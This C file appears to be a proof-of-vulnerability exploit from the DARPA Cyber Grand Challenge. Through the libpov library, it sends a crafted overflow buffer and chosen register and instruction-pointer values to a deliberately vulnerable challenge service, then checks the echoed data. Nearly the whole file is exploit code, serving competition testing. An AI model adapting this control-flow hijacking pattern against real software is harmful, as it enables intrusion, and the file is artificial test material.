/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#include <libpov.h>
int main(void) {
   type1_vals t1vals;
   type1_negotiate(0xedededed, 0xedededed, 7, &t1vals); // can use either EAX(0) or EDI(7)
   unsigned int no_ed = 0x12121212; // have to prevent 0xed from each byte of EIP and REG
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xad\xdd\xad\xdd";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x38\x31\x39\x36\x33\x38\x39\x30";
      static unsigned int write_00001_00000_len = 8;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         transmit_all(1, write_00001, write_00001_len);
      }
      free(write_00001);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x8c\xdc\x00\x00\x14\xae\x07\x41\x47\x71\x56\x59\x4e\x4e\x43\x54"
         "\x64\x46\x54\x6f\x4a\x67\x62\x6e\x4b\x56\x73\x4e\x72\x4a\x54\x72"
         "\x42\x45\x44\x65\x50\x57\x7a\x53\x4b\x6a\x51\x51\x68\x75\x53\x6f"
         "\x74\x75\x71\x49\x4a\x70\x63\x67\x52\x49\x76\x74\x4a\x70\x49\x4d"
         "\x4c\x4b\x62\x71\x44\x79\x76\x6a\x4f\x53\x41\x47\x66\x75\x46\x6c"
         "\x4f\x41\x51\x66\x54\x4d\x64\x4e\x4d\x7a\x52\x56\x43\x48\x78\x64"
         "\x4a\x43\x5a\x53\x4a\x52\x52\x61\x4c\x63\x7a\x43\x41\x69\x6c\x66"
         "\x4f\x76\x64\x62\x6e\x4b\x6e\x48\x77\x6a\x51\x43\x7a\x6c\x4a\x61"
         "\x66\x4f\x47\x68\x6a\x5a\x5a\x41";
      static unsigned int write_00002_00000_len = 136;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         transmit_all(1, write_00002, write_00002_len);
      }
      free(write_00002);
   } while (0);

   do { // EAX (have to prevent 0xed frm each of the 4 bytes)
      //*** writing data
      unsigned int reg = t1vals.regval | no_ed; 
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = append_buf(write_00003, &write_00003_len, (unsigned char*)&reg, 4);
      if (write_00003_len > 0) {
         transmit_all(1, write_00003, write_00003_len);
      }
      free(write_00003);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00004_00000[] = 
         "\x43\x43\x43\x43";
      static unsigned int write_00004_00000_len = 4;
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = append_buf(write_00004, &write_00004_len, write_00004_00000, write_00004_00000_len);
      if (write_00004_len > 0) {
         transmit_all(1, write_00004, write_00004_len);
      }
      free(write_00004);
   } while (0);

   do { // EIP (have to prevent 0xed from each of the 4 bytes)
      //*** writing data
      unsigned int eip = t1vals.ipval | no_ed; 
      unsigned char *write_00005 = NULL;
      unsigned int write_00005_len = 0;
      write_00005 = append_buf(write_00005, &write_00005_len, (unsigned char*)&eip, 4);
      if (write_00005_len > 0) {
         transmit_all(1, write_00005, write_00005_len);
      }
      free(write_00005);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00006_00000[] = 
         "\xed";
      static unsigned int write_00006_00000_len = 1;
      unsigned char *write_00006 = NULL;
      unsigned int write_00006_len = 0;
      write_00006 = append_buf(write_00006, &write_00006_len, write_00006_00000, write_00006_00000_len);
      if (write_00006_len > 0) {
         transmit_all(1, write_00006, write_00006_len);
      }
      free(write_00006);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 2;
      read_00000 = (unsigned char*)malloc(read_00000_len);
      int read_00000_res = length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00007_00000[] = 
         "\xc4\xec\x4e\xee";
      static unsigned int write_00007_00000_len = 4;
      unsigned char *write_00007 = NULL;
      unsigned int write_00007_len = 0;
      write_00007 = append_buf(write_00007, &write_00007_len, write_00007_00000, write_00007_00000_len);
      if (write_00007_len > 0) {
         transmit_all(1, write_00007, write_00007_len);
      }
      free(write_00007);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00008_00000[] = 
         "\x38\x31\x39\x36\x33\x38\x39\x30";
      static unsigned int write_00008_00000_len = 8;
      unsigned char *write_00008 = NULL;
      unsigned int write_00008_len = 0;
      write_00008 = append_buf(write_00008, &write_00008_len, write_00008_00000, write_00008_00000_len);
      if (write_00008_len > 0) {
         transmit_all(1, write_00008, write_00008_len);
      }
      free(write_00008);
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 4;
      read_00001 = (unsigned char*)malloc(read_00001_len);
      int read_00001_res = length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** length read
      read_00002_len = 4;
      read_00002 = (unsigned char*)malloc(read_00002_len);
      int read_00002_res = length_read(0, read_00002, read_00002_len);
      if (read_00002_res) {} //silence unused variable warning
      free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** length read
      read_00003_len = 141;
      read_00003 = (unsigned char*)malloc(read_00003_len);
      int read_00003_res = length_read(0, read_00003, read_00003_len);
      if (read_00003_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00003_00000[] = 
         "\x47\x71\x56\x59\x4e\x4e\x43\x54\x64\x46\x54\x6f\x4a\x67\x62\x6e"
         "\x4b\x56\x73\x4e\x72\x4a\x54\x72\x42\x45\x44\x65\x50\x57\x7a\x53"
         "\x4b\x6a\x51\x51\x68\x75\x53\x6f\x74\x75\x71\x49\x4a\x70\x63\x67"
         "\x52\x49\x76\x74\x4a\x70\x49\x4d\x4c\x4b\x62\x71\x44\x79\x76\x6a"
         "\x4f\x53\x41\x47\x66\x75\x46\x6c\x4f\x41\x51\x66\x54\x4d\x64\x4e"
         "\x4d\x7a\x52\x56\x43\x48\x78\x64\x4a\x43\x5a\x53\x4a\x52\x52\x61"
         "\x4c\x63\x7a\x43\x41\x69\x6c\x66\x4f\x76\x64\x62\x6e\x4b\x6e\x48"
         "\x77\x6a\x51\x43\x7a\x6c\x4a\x61\x66\x4f\x47\x68\x6a\x5a\x5a\x41"
         "\x4d\x4d\x4d\x4d\x43\x43\x43\x43\x45\x45\x45\x45\xed";
      read_00003_ptr += data_match(read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, match_00003_00000, 141);
      free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** length read
      read_00004_len = 2;
      read_00004 = (unsigned char*)malloc(read_00004_len);
      int read_00004_res = length_read(0, read_00004, read_00004_len);
      if (read_00004_res) {} //silence unused variable warning
      free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00009_00000[] = 
         "\xff\xff\xff\xff";
      static unsigned int write_00009_00000_len = 4;
      unsigned char *write_00009 = NULL;
      unsigned int write_00009_len = 0;
      write_00009 = append_buf(write_00009, &write_00009_len, write_00009_00000, write_00009_00000_len);
      if (write_00009_len > 0) {
         transmit_all(1, write_00009, write_00009_len);
      }
      free(write_00009);
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** length read
      read_00005_len = 2;
      read_00005 = (unsigned char*)malloc(read_00005_len);
      int read_00005_res = length_read(0, read_00005, read_00005_len);
      if (read_00005_res) {} //silence unused variable warning
      free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
}
